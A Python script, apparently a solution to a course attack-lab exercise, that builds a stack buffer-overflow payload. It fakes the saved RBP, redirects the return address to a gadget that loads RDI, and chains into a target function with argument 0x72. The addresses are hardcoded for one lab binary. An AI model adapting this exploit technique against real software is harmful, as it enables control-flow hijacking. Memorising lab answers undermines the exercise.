import struct

# 1. 目标函数 entry
func1_addr = 0x401216

# 2. 设置参数的 Gadget (mov_rdi 中间段)
# 逻辑: rax = [rbp-8]; rdi = rax; ret
gadget_addr = 0x4012e6

# 3. 栈地址计算
# 0x7fffffffd968 是返回地址的位置
stack_ret_addr = 0x7fffffffd968
buffer_addr = stack_ret_addr - 40

# 4. 伪造 RBP
# 我们设置 rbp = buffer_addr + 8
# 这样 gadget 读取 -0x8(%rbp) 时，实际读的就是 buffer_addr (buffer的开头)
fake_rbp = buffer_addr + 8

# === 组装 Payload (64 bytes) ===

# [0-8字节] 参数值 0x72 (放在 buffer 开头，对应 rbp-8)
payload = struct.pack("<Q", 0x72)

# [8-32字节] 填充 (24字节)
payload += b"A" * 24

# [32-40字节] 伪造 RBP (覆盖 Saved RBP)
payload += struct.pack("<Q", fake_rbp)

# [40-48字节] 覆盖返回地址 -> 跳去 Gadget
payload += struct.pack("<Q", gadget_addr)

# [48-56字节] Gadget 返回地址 -> 跳去 func1
# 当 gadget 执行 ret 时，它会从这里取地址跳过去
payload += struct.pack("<Q", func1_addr)

# [56-64字节] 填充对齐
payload += b"B" * 8

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"✅ 最终 Payload (RDI版) 生成完毕!")